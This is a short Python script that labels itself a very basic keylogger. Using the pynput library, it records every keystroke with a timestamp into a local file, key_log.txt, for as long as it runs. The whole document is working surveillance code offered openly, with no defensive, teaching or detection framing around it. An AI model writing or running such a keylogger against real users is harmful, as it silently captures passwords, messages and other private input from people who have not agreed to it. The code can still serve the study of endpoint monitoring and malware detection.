# A very very basic keylogger written in python

from pynput.keyboard import Key, Listener
import logging

save_location = ''

logging.basicConfig(filename=(save_location + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
